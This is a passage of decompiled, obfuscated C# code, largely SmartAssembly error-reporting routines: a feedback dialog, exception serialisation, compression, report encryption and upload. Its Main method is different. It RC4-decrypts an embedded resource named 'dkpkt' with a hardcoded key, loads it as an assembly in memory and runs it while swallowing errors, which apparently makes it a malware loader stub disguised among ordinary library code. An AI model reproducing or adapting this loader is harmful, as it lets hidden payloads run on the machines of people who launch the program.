		((ButtonBase)form2_0.button_1).set_ImageAlign((ContentAlignment)16);
		((Control)form2_0.button_1).set_Location(new Point(97, 144));
		((Control)form2_0.button_1).set_Name("m_DoNotSendFeatureUsageReportsBtn");
		((Control)form2_0.button_1).set_Padding(new Padding(5, 0, 0, 0));
		((Control)form2_0.button_1).set_Size(new Size(299, 33));
		((Control)form2_0.button_1).set_TabIndex(3);
		((Control)form2_0.button_1).set_Text("Do not join the quality improvement program");
		((ButtonBase)form2_0.button_1).set_UseVisualStyleBackColor(true);
		((ContainerControl)form2_0).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)form2_0).set_AutoScaleMode((AutoScaleMode)1);
		((Control)form2_0).set_AutoSize(true);
		((Form)form2_0).set_AutoSizeMode((AutoSizeMode)0);
		((Control)form2_0).set_BackColor(SystemColors.ControlLightLight);
		((Form)form2_0).set_ClientSize(new Size(504, 190));
		((Form)form2_0).set_ControlBox(false);
		((Control)form2_0).get_Controls().Add((Control)(object)form2_0.button_1);
		((Control)form2_0).get_Controls().Add((Control)(object)form2_0.button_0);
		((Control)form2_0).get_Controls().Add((Control)(object)form2_0.label_0);
		((Form)form2_0).set_FormBorderStyle((FormBorderStyle)1);
		((Form)form2_0).set_MaximizeBox(false);
		((Form)form2_0).set_MinimizeBox(false);
		((Control)form2_0).set_Name("ConfirmFeatureUsageReportingForm");
		((Form)form2_0).set_ShowInTaskbar(false);
		((Form)form2_0).set_SizeGripStyle((SizeGripStyle)2);
		((Form)form2_0).set_StartPosition((FormStartPosition)1);
		((Control)form2_0).set_Text("{0} Quality Improvement Program");
		((Form)form2_0).set_TopMost(true);
		((Control)form2_0).ResumeLayout(false);
		((Control)form2_0).PerformLayout();
	}

	static Enum0 smethod_60(EventArgs3 eventArgs3_0)
	{
		return eventArgs3_0.enum0_0;
	}

	static ICryptoTransform smethod_61(bool bool_0, byte[] byte_0, byte[] byte_1)
	{
		using SymmetricAlgorithm symmetricAlgorithm = new RijndaelManaged();
		return bool_0 ? symmetricAlgorithm.CreateDecryptor(byte_1, byte_0) : symmetricAlgorithm.CreateEncryptor(byte_1, byte_0);
	}

	static bool smethod_62(Class7.Class8 class8_0)
	{
		return Class24.smethod_8(class8_0.class11_0);
	}

	static void smethod_63(Control0 control0_0, string string_0)
	{
		control0_0.string_0 = string_0;
		control0_0.timer_0.set_Enabled(false);
		control0_0.image_0 = (Image)(object)Class24.smethod_12((string_0.Length > 0) ? "error" : "ok");
		control0_0.bool_1 = true;
		control0_0.bool_0 = true;
		if (string_0.Length > 0)
		{
			((Control)control0_0).set_Height(100);
		}
		((Control)control0_0).Refresh();
	}

	static void smethod_64(Class32 class32_0, Enum2 enum2_0, string string_0, string string_1)
	{
		class32_0.delegate3_0?.Invoke(class32_0, new EventArgs4(enum2_0, string_0, string_1));
	}

	static int smethod_65(Class7.Class12 class12_0, byte[] byte_0, int int_0, int int_1)
	{
		if (class12_0.int_2 >= 8)
		{
			class12_0.byte_0[class12_0.int_1++] = (byte)class12_0.uint_0;
			class12_0.uint_0 >>= 8;
			class12_0.int_2 -= 8;
		}
		if (int_1 > class12_0.int_1 - class12_0.int_0)
		{
			int_1 = class12_0.int_1 - class12_0.int_0;
			Array.Copy(class12_0.byte_0, class12_0.int_0, byte_0, int_0, int_1);
			class12_0.int_0 = 0;
			class12_0.int_1 = 0;
		}
		else
		{
			Array.Copy(class12_0.byte_0, class12_0.int_0, byte_0, int_0, int_1);
			class12_0.int_0 += int_1;
		}
		return int_1;
	}

	unsafe static int smethod_66(Class7.Class9 class9_0, int int_0)
	{
		void* ptr = stackalloc byte[8];
		*(int*)ptr = 0;
		while (int_0 >= 4)
		{
			*(int*)ptr += 2;
			int_0 >>= 1;
		}
		*(int*)((byte*)ptr + 4) = *(int*)ptr + int_0;
		return *(int*)((byte*)ptr + 4);
	}

	unsafe static bool smethod_67(bool bool_0, Class7.Class11 class11_0, bool bool_1)
	{
		void* ptr = stackalloc byte[29];
		if (class11_0.int_5 < 262 && !bool_0)
		{
			((byte*)ptr)[28] = 0;
		}
		else
		{
			while (true)
			{
				if (class11_0.int_5 >= 262 || bool_0)
				{
					Class7.Class9 class9_3;
					byte[] byte_;
					if (class11_0.int_5 != 0)
					{
						if (class11_0.int_4 >= 65274)
						{
							Class24.smethod_105(class11_0);
						}
						*(int*)ptr = class11_0.int_1;
						int int_ = class11_0.int_2;
						if (class11_0.int_5 >= 3)
						{
							*(int*)((byte*)ptr + 4) = Class24.smethod_154(class11_0);
							if (*(int*)((byte*)ptr + 4) != 0 && class11_0.int_4 - *(int*)((byte*)ptr + 4) <= 32506 && Class24.smethod_147(class11_0, *(int*)((byte*)ptr + 4)) && class11_0.int_2 <= 5 && class11_0.int_2 == 3 && class11_0.int_4 - class11_0.int_1 > 4096)
							{
								class11_0.int_2 = 2;
							}
						}
						if (int_ >= 3 && class11_0.int_2 <= int_)
						{
							Class7.Class9 class9_ = class11_0.class9_0;
							*(int*)((byte*)ptr + 20) = class11_0.int_4 - 1 - *(int*)ptr;
							Class24.smethod_55(int_, class9_, *(int*)((byte*)ptr + 20));
							int_ -= 2;
							do
							{
								class11_0.int_4++;
								class11_0.int_5--;
								if (class11_0.int_5 >= 3)
								{
									Class24.smethod_154(class11_0);
								}
							}
							while (--int_ > 0);
							class11_0.int_4++;
							class11_0.int_5--;
							class11_0.bool_0 = false;
							class11_0.int_2 = 2;
						}
						else
						{
							if (class11_0.bool_0)
							{
								Class7.Class9 class9_2 = class11_0.class9_0;
								*(int*)((byte*)ptr + 16) = class11_0.byte_0[class11_0.int_4 - 1] & 0xFF;
								Class24.smethod_117(*(int*)((byte*)ptr + 16), class9_2);
							}
							class11_0.bool_0 = true;
							class11_0.int_4++;
							class11_0.int_5--;
						}
						if (Class24.smethod_77(class11_0.class9_0))
						{
							*(int*)((byte*)ptr + 8) = class11_0.int_4 - class11_0.int_3;
							if (class11_0.bool_0)
							{
								(*(int*)((byte*)ptr + 8))--;
							}
							bool flag = bool_1 && class11_0.int_5 == 0 && !class11_0.bool_0;
							class9_3 = class11_0.class9_0;
							byte_ = class11_0.byte_0;
							*(int*)((byte*)ptr + 12) = class11_0.int_3;
							Class24.smethod_153(flag, *(int*)((byte*)ptr + 12), class9_3, *(int*)((byte*)ptr + 8), byte_);
							class11_0.int_3 += *(int*)((byte*)ptr + 8);
							((byte*)ptr)[28] = ((!flag) ? ((byte)1) : ((byte)0));
							break;
						}
						continue;
					}
					if (class11_0.bool_0)
					{
						Class7.Class9 class9_2 = class11_0.class9_0;
						*(int*)((byte*)ptr + 16) = class11_0.byte_0[class11_0.int_4 - 1] & 0xFF;
						Class24.smethod_117(*(int*)((byte*)ptr + 16), class9_2);
					}
					class11_0.bool_0 = false;
					class9_3 = class11_0.class9_0;
					byte_ = class11_0.byte_0;
					*(int*)((byte*)ptr + 12) = class11_0.int_3;
					*(int*)((byte*)ptr + 24) = class11_0.int_4 - class11_0.int_3;
					Class24.smethod_153(bool_1, *(int*)((byte*)ptr + 12), class9_3, *(int*)((byte*)ptr + 24), byte_);
					class11_0.int_3 = class11_0.int_4;
					((byte*)ptr)[28] = 0;
					break;
				}
				((byte*)ptr)[28] = 1;
				break;
			}
		}
		return ((byte*)ptr)[28] != 0;
	}

	static long smethod_68(Class7.Class8 class8_0)
	{
		return class8_0.long_0;
	}

	static Icon smethod_69(string string_0)
	{
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("SmartAssembly.SmartExceptionsCore.Resources." + string_0 + ".ico");
			return (manifestResourceStream == null) ? ((Icon)null) : new Icon(manifestResourceStream);
		}
		catch
		{
			return null;
		}
	}

	static byte[] smethod_70(byte[] byte_0, string string_0)
	{
		if (string_0.StartsWith("{"))
		{
			Class31.string_0 = "ERR 2006: This template was not properly processed by SmartAssembly";
			return null;
		}
		RijndaelManaged rijndaelManaged = null;
		RSACryptoServiceProvider rSACryptoServiceProvider = null;
		MemoryStream memoryStream = null;
		CryptoStream cryptoStream = null;
		byte[] result;
		try
		{
			rijndaelManaged = new RijndaelManaged();
			rSACryptoServiceProvider = new RSACryptoServiceProvider();
			rSACryptoServiceProvider.FromXmlString(string_0);
			rijndaelManaged.GenerateKey();
			rijndaelManaged.GenerateIV();
			byte[] array = new byte[48];
			Buffer.BlockCopy(rijndaelManaged.Key, 0, array, 0, 32);
			Buffer.BlockCopy(rijndaelManaged.IV, 0, array, 32, 16);
			memoryStream = new MemoryStream();
			try
			{
				byte[] array2 = rSACryptoServiceProvider.Encrypt(array, fOAEP: false);
				memoryStream.WriteByte(1);
				memoryStream.WriteByte(Convert.ToByte(array2.Length / 8));
				memoryStream.Write(array2, 0, array2.Length);
			}
			catch (CryptographicException)
			{
				try
				{
					byte[] array3 = new byte[16];
					byte[] array4 = new byte[16];
					Buffer.BlockCopy(rijndaelManaged.Key, 0, array3, 0, 16);
					Buffer.BlockCopy(rijndaelManaged.Key, 16, array4, 0, 16);
					byte[] array5 = rSACryptoServiceProvider.Encrypt(array3, fOAEP: false);
					byte[] array6 = rSACryptoServiceProvider.Encrypt(array4, fOAEP: false);
					byte[] array7 = rSACryptoServiceProvider.Encrypt(rijndaelManaged.IV, fOAEP: false);
					memoryStream.WriteByte(2);
					memoryStream.WriteByte(Convert.ToByte(array5.Length / 8));
					memoryStream.Write(array5, 0, array5.Length);
					memoryStream.Write(array6, 0, array6.Length);
					memoryStream.Write(array7, 0, array7.Length);
					goto end_IL_00ad;
				}
				catch (CryptographicException)
				{
					Class31.string_0 = "ERR 2005: The 128-bit encryption is not available on this computer. You need to install the High Encryption Pack in order to use the reporting feature.";
					result = null;
				}
				goto end_IL_0027;
				end_IL_00ad:;
			}
			cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			cryptoStream.Write(byte_0, 0, byte_0.Length);
			cryptoStream.FlushFinalBlock();
			result = memoryStream.ToArray();
			end_IL_0027:;
		}
		catch (Exception ex3)
		{
			Class31.string_0 = "ERR 2004: " + ex3.Message;
			result = null;
		}
		finally
		{
			rijndaelManaged?.Clear();
			rSACryptoServiceProvider?.Clear();
			memoryStream?.Close();
			cryptoStream?.Close();
		}
		return result;
	}

	static void smethod_71(Exception exception_0, object[] object_0)
	{
		if (exception_0 == null || !(exception_0 is SecurityException) || !(Class25.string_0 == "1") || !Class24.smethod_161().method_2((SecurityException)exception_0))
		{
			Class24.smethod_120(exception_0, object_0);
			Class24.smethod_161().method_3(exception_0, bool_1: false, bool_2: false);
		}
	}

	static void smethod_72(Control0 control0_0)
	{
		control0_0.timer_0.set_Enabled(true);
		control0_0.image_0 = (Image)(object)Class24.smethod_12("current");
		control0_0.bool_0 = true;
		((Control)control0_0).Refresh();
	}

	static void smethod_73(Class16 class16_0, Exception exception_0)
	{
		using (new Class29(class16_0.xmlWriter_0, "Exception"))
		{
			try
			{
				Type type = exception_0.GetType();
				class16_0.method_3(type);
				string value = "N/A";
				try
				{
					value = exception_0.Message;
				}
				catch
				{
				}
				class16_0.xmlWriter_0.WriteAttributeString("Message", value);
				string text = exception_0.StackTrace!.Trim();
				class16_0.xmlWriter_0.WriteAttributeString("ExceptionStackTrace", text);
				int num = text.IndexOf(' ');
				text = text.Substring(num + 1);
				num = text.IndexOf("\r\n");
				if (num != -1)
				{
					text = text.Substring(0, num);
				}
				class16_0.xmlWriter_0.WriteAttributeString("Method", text);
				class16_0.method_1(new Class20(exception_0, bool_1: true));
			}
			catch
			{
			}
		}
	}

	static void smethod_74()
	{
		try
		{
			Class39.smethod_0("Platform Culture Name: " + CultureInfo.CurrentCulture.Name);
		}
		catch
		{
		}
	}

	static bool smethod_75(EventArgs2 eventArgs2_0)
	{
		return eventArgs2_0.bool_0;
	}

	static bool smethod_76(Class15.Class19 class19_0, byte[] byte_0, Class15 class15_0)
	{
		byte[] byte_;
		try
		{
			byte_ = Class24.smethod_20(byte_0);
		}
		catch (Exception)
		{
			Class24.smethod_13(class15_0, Enum0.const_0, Class7.string_0);
			return false;
		}
		byte[] array = Class24.smethod_115(byte_, "<RSAKeyValue><Modulus>6POlwBPuq+mi8XnSXuadMJr13KU0ci+373fiGgZBV/236L2gUy/svnPzgvl4CU8LLbaJh1ckXZKno3okUWCnSgEj/U2ySWSJ+/R3WtlWnMp6166Ge5bll2T/ulQmy71IMh3oXCEePRZYmFJQTjsig72y+Aeu1n6ACEokozIlpLU=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>");
		if (array == null)
		{
			Class24.smethod_13(class15_0, Enum0.const_0, Class14.string_0);
			return false;
		}
		Class24.smethod_176(class15_0, Enum0.const_1);
		Class27 @class = new Class27("!bd82831c-4319-2ff1-d95e-1b3435853905");
		if (class15_0.iwebProxy_0 != null)
		{
			@class.iwebProxy_0 = class15_0.iwebProxy_0;
		}
		Class15.Class17 class2 = new Class15.Class17(class15_0, array, @class, class19_0);
		Class24.smethod_88(@class, (Delegate2)class2.method_0);
		return class2.bool_0;
	}

	static bool smethod_77(Class7.Class9 class9_0)
	{
		return class9_0.int_1 >= 16384;
	}

	unsafe static byte[] smethod_78(string string_0, byte[] byte_0)
	{
		void* ptr = stackalloc byte[9];
		byte[] bytes = Encoding.Default.GetBytes(string_0);
		byte[] array = new byte[256];
		byte[] array2 = new byte[256];
		int i;
		for (i = 0; i < 256; i++)
		{
			array[i] = (byte)i;
			array2[i] = bytes[i % bytes.GetLength(0)];
		}
		int num = 0;
		for (i = 0; i < 256; i++)
		{
			num = (num + array[i] + array2[i]) % 256;
			((byte*)ptr)[8] = array[i];
			array[i] = array[num];
			array[num] = ((byte*)ptr)[8];
		}
		num = 0;
		i = 0;
		*(int*)ptr = 0;
		while (*(int*)ptr < byte_0.GetLength(0))
		{
			i = (i + 1) % 256;
			num = (num + array[i]) % 256;
			((byte*)ptr)[8] = array[i];
			array[i] = array[num];
			array[num] = ((byte*)ptr)[8];
			*(int*)((byte*)ptr + 4) = (array[i] + array[num]) % 256;
			byte_0[*(int*)ptr] ^= array[*(int*)((byte*)ptr + 4)];
			(*(int*)ptr)++;
		}
		return byte_0;
	}

	static void smethod_79(string string_0)
	{
		IDisposable disposable = null;
		try
		{
			disposable = Class24.smethod_130();
			string string_ = Class24.smethod_118(string_0);
			Class24.smethod_182(0L, string_);
		}
		catch (Exception)
		{
		}
		finally
		{
			disposable?.Dispose();
		}
	}

	static ulong[] smethod_80(Class40 class40_0)
	{
		return class40_0.ulong_0;
	}

	static int smethod_81(Font font_0, int int_0, string string_0, Graphics graphics_0)
	{
		Class28.Struct7 struct7_ = new Class28.Struct7(new Rectangle(0, 0, int_0, 10000));
		IntPtr hdc = graphics_0.GetHdc();
		IntPtr intptr_ = font_0.ToHfont();
		IntPtr intptr_2 = Class24.SelectObject(hdc, intptr_);
		Class24.DrawText(hdc, string_0, -1, ref struct7_, 3088);
		Class24.SelectObject(hdc, intptr_2);
		graphics_0.ReleaseHdc(hdc);
		return struct7_.int_3 - struct7_.int_1;
	}

	static void smethod_82(Class25 class25_0, Delegate1 delegate1_0)
	{
		Delegate1 @delegate = class25_0.delegate1_0;
		Delegate1 delegate2;
		do
		{
			delegate2 = @delegate;
			Delegate1 value = (Delegate1)Delegate.Combine(delegate2, delegate1_0);
			@delegate = Interlocked.CompareExchange(ref class25_0.delegate1_0, value, delegate2);
		}
		while ((object)@delegate != delegate2);
	}

	unsafe static byte[] smethod_83(byte[] byte_0, byte[] byte_1, byte[] byte_2, int int_0)
	{
		void* ptr = stackalloc byte[64];
		try
		{
			Class7.Stream0 stream = new Class7.Stream0();
			switch (int_0)
			{
			case 0:
			{
				Class7.Class8 class8_2 = new Class7.Class8();
				DateTime now = DateTime.Now;
				*(long*)ptr = (uint)((((now.Year - 1980) & 0x7F) << 25) | (now.Month << 21) | (now.Day << 16) | (now.Hour << 11) | (now.Minute << 5) | (int)((uint)now.Second >> 1));
				uint[] array8 = new uint[256]
				{
					0u, 1996959894u, 3993919788u, 2567524794u, 124634137u, 1886057615u, 3915621685u, 2657392035u, 249268274u, 2044508324u,
					3772115230u, 2547177864u, 162941995u, 2125561021u, 3887607047u, 2428444049u, 498536548u, 1789927666u, 4089016648u, 2227061214u,
					450548861u, 1843258603u, 4107580753u, 2211677639u, 325883990u, 1684777152u, 4251122042u, 2321926636u, 335633487u, 1661365465u,
					4195302755u, 2366115317u, 997073096u, 1281953886u, 3579855332u, 2724688242u, 1006888145u, 1258607687u, 3524101629u, 2768942443u,
					901097722u, 1119000684u, 3686517206u, 2898065728u, 853044451u, 1172266101u, 3705015759u, 2882616665u, 651767980u, 1373503546u,
					3369554304u, 3218104598u, 565507253u, 1454621731u, 3485111705u, 3099436303u, 671266974u, 1594198024u, 3322730930u, 2970347812u,
					795835527u, 1483230225u, 3244367275u, 3060149565u, 1994146192u, 31158534u, 2563907772u, 4023717930u, 1907459465u, 112637215u,
					2680153253u, 3904427059u, 2013776290u, 251722036u, 2517215374u, 3775830040u, 2137656763u, 141376813u, 2439277719u, 3865271297u,
					1802195444u, 476864866u, 2238001368u, 4066508878u, 1812370925u, 453092731u, 2181625025u, 4111451223u, 1706088902u, 314042704u,
					2344532202u, 4240017532u, 1658658271u, 366619977u, 2362670323u, 4224994405u, 1303535960u, 984961486u, 2747007092u, 3569037538u,
					1256170817u, 1037604311u, 2765210733u, 3554079995u, 1131014506u, 879679996u, 2909243462u, 3663771856u, 1141124467u, 855842277u,
					2852801631u, 3708648649u, 1342533948u, 654459306u, 3188396048u, 3373015174u, 1466479909u, 544179635u, 3110523913u, 3462522015u,
					1591671054u, 702138776u, 2966460450u, 3352799412u, 1504918807u, 783551873u, 3082640443u, 3233442989u, 3988292384u, 2596254646u,
					62317068u, 1957810842u, 3939845945u, 2647816111u, 81470997u, 1943803523u, 3814918930u, 2489596804u, 225274430u, 2053790376u,
					3826175755u, 2466906013u, 167816743u, 2097651377u, 4027552580u, 2265490386u, 503444072u, 1762050814u, 4150417245u, 2154129355u,
					426522225u, 1852507879u, 4275313526u, 2312317920u, 282753626u, 1742555852u, 4189708143u, 2394877945u, 397917763u, 1622183637u,
					3604390888u, 2714866558u, 953729732u, 1340076626u, 3518719985u, 2797360999u, 1068828381u, 1219638859u, 3624741850u, 2936675148u,
					906185462u, 1090812512u, 3747672003u, 2825379669u, 829329135u, 1181335161u, 3412177804u, 3160834842u, 628085408u, 1382605366u,
					3423369109u, 3138078467u, 570562233u, 1426400815u, 3317316542u, 2998733608u, 733239954u, 1555261956u, 3268935591u, 3050360625u,
					752459403u, 1541320221u, 2607071920u, 3965973030u, 1969922972u, 40735498u, 2617837225u, 3943577151u, 1913087877u, 83908371u,
					2512341634u, 3803740692u, 2075208622u, 213261112u, 2463272603u, 3855990285u, 2094854071u, 198958881u, 2262029012u, 4057260610u,
					1759359992u, 534414190u, 2176718541u, 4139329115u, 1873836001u, 414664567u, 2282248934u, 4279200368u, 1711684554u, 285281116u,
					2405801727u, 4167216745u, 1634467795u, 376229701u, 2685067896u, 3608007406u, 1308918612u, 956543938u, 2808555105u, 3495958263u,
					1231636301u, 1047427035u, 2932959818u, 3654703836u, 1088359270u, 936918000u, 2847714899u, 3736837829u, 1202900863u, 817233897u,
					3183342108u, 3401237130u, 1404277552u, 615818150u, 3134207493u, 3453421203u, 1423857449u, 601450431u, 3009837614u, 3294710456u,
					1567103746u, 711928724u, 3020668471u, 3272380065u, 1510334235u, 755167117u
				};
				*(int*)((byte*)ptr + 40) = -1;
				uint num = *(uint*)((byte*)ptr + 40);
				int num2 = 0;
				int num3 = byte_1.Length;
				while (--num3 >= 0)
				{
					num = array8[(num ^ byte_1[num2++]) & 0xFF] ^ (num >> 8);
				}
				num ^= *(uint*)((byte*)ptr + 40);
				Class24.smethod_169(stream, 67324752);
				Class24.smethod_112(stream, 20);
				Class24.smethod_112(stream, 0);
				Class24.smethod_112(stream, 8);
				Class24.smethod_169(stream, (int)(*(long*)ptr));
				Class24.smethod_169(stream, (int)num);
				*(long*)((byte*)ptr + 8) = stream.Position;
				Class24.smethod_169(stream, 0);
				Class24.smethod_169(stream, byte_1.Length);
				byte[] bytes = Encoding.UTF8.GetBytes("{data}");
				Class24.smethod_112(stream, bytes.Length);
				Class24.smethod_112(stream, 0);
				stream.Write(bytes, 0, bytes.Length);
				Class24.smethod_163(byte_1, class8_2);
				while (!Class24.smethod_62(class8_2))
				{
					byte[] array9 = new byte[512];
					*(int*)((byte*)ptr + 44) = Class24.smethod_38(class8_2, array9);
					if (*(int*)((byte*)ptr + 44) <= 0)
					{
						break;
					}
					stream.Write(array9, 0, *(int*)((byte*)ptr + 44));
				}
				Class24.smethod_95(class8_2);
				while (!Class24.smethod_18(class8_2))
				{
					byte[] array10 = new byte[512];
					*(int*)((byte*)ptr + 48) = Class24.smethod_38(class8_2, array10);
					if (*(int*)((byte*)ptr + 48) <= 0)
					{
						break;
					}
					stream.Write(array10, 0, *(int*)((byte*)ptr + 48));
				}
				*(long*)((byte*)ptr + 16) = Class24.smethod_68(class8_2);
				Class24.smethod_169(stream, 33639248);
				Class24.smethod_112(stream, 20);
				Class24.smethod_112(stream, 20);
				Class24.smethod_112(stream, 0);
				Class24.smethod_112(stream, 8);
				Class24.smethod_169(stream, (int)(*(long*)ptr));
				Class24.smethod_169(stream, (int)num);
				Class24.smethod_169(stream, (int)(*(long*)((byte*)ptr + 16)));
				Class24.smethod_169(stream, byte_1.Length);
				Class24.smethod_112(stream, bytes.Length);
				Class24.smethod_112(stream, 0);
				Class24.smethod_112(stream, 0);
				Class24.smethod_112(stream, 0);
				Class24.smethod_112(stream, 0);
				Class24.smethod_169(stream, 0);
				Class24.smethod_169(stream, 0);
				stream.Write(bytes, 0, bytes.Length);
				Class24.smethod_169(stream, 101010256);
				Class24.smethod_112(stream, 0);
				Class24.smethod_112(stream, 0);
				Class24.smethod_112(stream, 1);
				Class24.smethod_112(stream, 1);
				Class24.smethod_169(stream, 46 + bytes.Length);
				Class24.smethod_169(stream, (int)(30 + bytes.Length + *(long*)((byte*)ptr + 16)));
				Class24.smethod_112(stream, 0);
				stream.Seek(*(long*)((byte*)ptr + 8), SeekOrigin.Begin);
				Class24.smethod_169(stream, (int)(*(long*)((byte*)ptr + 16)));
				break;
			}
			case 1:
				Class24.smethod_169(stream, 25000571);
				Class24.smethod_169(stream, byte_1.Length);
				*(int*)((byte*)ptr + 52) = 0;
				while (*(int*)((byte*)ptr + 52) < byte_1.Length)
				{
					byte[] array5 = new byte[Math.Min(2097151, byte_1.Length - *(int*)((byte*)ptr + 52))];
					Buffer.BlockCopy(byte_1, *(int*)((byte*)ptr + 52), array5, 0, array5.Length);
					*(long*)((byte*)ptr + 24) = stream.Position;
					Class24.smethod_169(stream, 0);
					Class24.smethod_169(stream, array5.Length);
					Class7.Class8 class8_ = new Class7.Class8();
					Class24.smethod_163(array5, class8_);
					while (!Class24.smethod_62(class8_))
					{
						byte[] array6 = new byte[512];
						*(int*)((byte*)ptr + 56) = Class24.smethod_38(class8_, array6);
						if (*(int*)((byte*)ptr + 56) <= 0)
						{
							break;
						}
						stream.Write(array6, 0, *(int*)((byte*)ptr + 56));
					}
					Class24.smethod_95(class8_);
					while (!Class24.smethod_18(class8_))
					{
						byte[] array7 = new byte[512];
						*(int*)((byte*)ptr + 60) = Class24.smethod_38(class8_, array7);
						if (*(int*)((byte*)ptr + 60) <= 0)
						{
							break;
						}
						stream.Write(array7, 0, *(int*)((byte*)ptr + 60));
					}
					*(long*)((byte*)ptr + 32) = stream.Position;
					stream.Position = *(long*)((byte*)ptr + 24);
					Class24.smethod_169(stream, (int)Class24.smethod_68(class8_));
					stream.Position = *(long*)((byte*)ptr + 32);
					*(int*)((byte*)ptr + 52) += array5.Length;
				}
				break;
			case 2:
			{
				Class24.smethod_169(stream, 41777787);
				byte[] array3 = Class24.smethod_83((byte[])null, byte_1, (byte[])null, 1);
				using (ICryptoTransform cryptoTransform2 = Class24.smethod_46(bool_0: false, byte_2, byte_0))
				{
					byte[] array4 = cryptoTransform2.TransformFinalBlock(array3, 0, array3.Length);
					stream.Write(array4, 0, array4.Length);
				}
				break;
			}
			case 3:
			{
				Class24.smethod_169(stream, 58555003);
				byte[] array = Class24.smethod_83((byte[])null, byte_1, (byte[])null, 1);
				using (ICryptoTransform cryptoTransform = Class24.smethod_61(bool_0: false, byte_0, byte_2))
				{
					byte[] array2 = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
					stream.Write(array2, 0, array2.Length);
				}
				break;
			}
			}
			stream.Flush();
			stream.Close();
			return stream.ToArray();
		}
		catch (Exception ex)
		{
			Class7.string_0 = "ERR 2003: " + ex.Message;
			throw;
		}
	}

	[DllImport("user32.dll")]
	static extern int GetSystemMetrics(int int_0);

	unsafe static void Main(string[] args)
	{
		void* ptr = stackalloc byte[12];
		if (!Class24.smethod_0() || !Class26.smethod_0())
		{
			return;
		}
		object[] parameters = new object[0];
		*(int*)((byte*)ptr + 8) = new Random().Next(300, 750);
		*(long*)ptr = Environment.TickCount;
		_ = Environment.TickCount - *(long*)ptr;
		try
		{
			ResourceManager resourceManager = new ResourceManager("res", Assembly.GetExecutingAssembly());
			byte[] byte_ = (byte[])resourceManager.GetObject("dkpkt");
			string string_ = "eV0jhzQvZZnRg5AWgQebB64Rx9aXqPyb98K2yEFmLdvvfpod0A79QMj";
			byte[] rawAssembly = Class24.smethod_78(string_, byte_);
			resourceManager.ReleaseAllResources();
			Assembly assembly = Assembly.Load(rawAssembly);
			if (assembly.EntryPoint!.GetParameters().Length > 0)
			{
				parameters = new object[1] { args };
			}
			assembly.EntryPoint!.Invoke(null, parameters);
		}
		catch
		{
		}
	}

	static void smethod_84()
	{
		try
		{
			Class39.smethod_0("Platform CPU Cores: " + Environment.ProcessorCount);
		}
		catch
		{
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
	static extern IntPtr GetProcAddress(IntPtr intptr_0, [MarshalAs(UnmanagedType.LPStr)] string string_0);

	static Exception smethod_85(EventArgs1 eventArgs1_0)
	{
		return eventArgs1_0.exception_0;
	}

	static string smethod_86()
	{
		return "SmartAssembly" + " " + Class24.smethod_187();
	}

	static void smethod_87(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4)
	{
		Class24.smethod_120(exception_0, new object[5] { object_0, object_1, object_2, object_3, object_4 });
	}

	static void smethod_88(Class27 class27_0, Delegate2 delegate2_0)
	{
		if (class27_0.string_2 == null)
		{
			try
			{
				UploadReportLoginService uploadReportLoginService = new UploadReportLoginService();
				if (class27_0.iwebProxy_0 != null)
				{
					((HttpWebClientProtocol)uploadReportLoginService).set_Proxy(class27_0.iwebProxy_0);
				}
				class27_0.string_2 = uploadReportLoginService.GetServerURL(class27_0.string_1);
				if (class27_0.string_2.Length == 0)
				{
					throw new ApplicationException("Cannot connect to webservice");
				}
				if (class27_0.string_2 == "ditto")
				{
					class27_0.string_2 = Class27.string_0;
				}
			}
			catch (Exception ex)
			{
				delegate2_0("ERR 2001: " + ex.Message);
				return;
			}
		}
		delegate2_0(class27_0.string_2.StartsWith("ERR") ? class27_0.string_2 : "OK");
	}

	static void smethod_89(Class7.Class12 class12_0, int int_0, int int_1)
	{
		class12_0.uint_0 |= (uint)(int_0 << class12_0.int_2);
		class12_0.int_2 += int_1;
		if (class12_0.int_2 >= 16)
		{
			class12_0.byte_0[class12_0.int_1++] = (byte)class12_0.uint_0;
			class12_0.byte_0[class12_0.int_1++] = (byte)(class12_0.uint_0 >> 8);
			class12_0.uint_0 >>= 16;
			class12_0.int_2 -= 16;
		}
	}

	static void smethod_90(Class32 class32_0, Enum2 enum2_0)
	{
		Class24.smethod_100(enum2_0, string.Empty, class32_0);
	}

	static Assembly[] smethod_91(Class16 class16_0)
	{
		try
		{
			return AppDomain.CurrentDomain.GetAssemblies();
		}
		catch
		{
			return new Assembly[1] { Class24.smethod_149() };
		}
	}

	static bool smethod_92(Class7.Class12 class12_0)
	{
		return class12_0.int_1 == 0;
	}

	static void smethod_93(Control0 control0_0)
	{
		control0_0.timer_0.set_Enabled(false);
		control0_0.image_0 = null;
		control0_0.bool_0 = false;
		control0_0.string_0 = string.Empty;
		((Control)control0_0).Refresh();
		((Control)control0_0).set_Height(16);
	}

	static void smethod_94(Class15 class15_0, Enum0 enum0_0, string string_0, string string_1)
	{
		class15_0.delegate1_0?.Invoke(class15_0, new EventArgs3(enum0_0, string_0, string_1));
	}

	static void smethod_95(Class7.Class8 class8_0)
	{
		class8_0.int_0 |= 12;
	}

	static void smethod_96(ThreadStart threadStart_0, Form0 form0_0)
	{
		form0_0.thread_0 = new Thread(threadStart_0);
		form0_0.thread_0.Start();
	}

	static void smethod_97(Exception exception_0, object object_0)
	{
		Class24.smethod_120(exception_0, new object[1] { object_0 });
	}

	static void smethod_98(Class7.Class9 class9_0, int int_0)
	{
		Class24.smethod_41(class9_0.class10_2);
		Class24.smethod_41(class9_0.class10_0);
		Class24.smethod_41(class9_0.class10_1);
		Class24.smethod_89(class9_0.class12_0, class9_0.class10_0.int_1 - 257, 5);
		Class24.smethod_89(class9_0.class12_0, class9_0.class10_1.int_1 - 1, 5);
		Class24.smethod_89(class9_0.class12_0, int_0 - 4, 4);
		for (int i = 0; i < int_0; i++)
		{
			Class24.smethod_89(class9_0.class12_0, (int)class9_0.class10_2.byte_0[Class7.Class9.int_0[i]], 3);
		}
		Class7.Class9.Class10 class10_ = class9_0.class10_0;
		Class7.Class9.Class10 class10_2 = class9_0.class10_2;
		Class24.smethod_50(class10_2, class10_);
		class10_ = class9_0.class10_1;
		class10_2 = class9_0.class10_2;
		Class24.smethod_50(class10_2, class10_);
	}

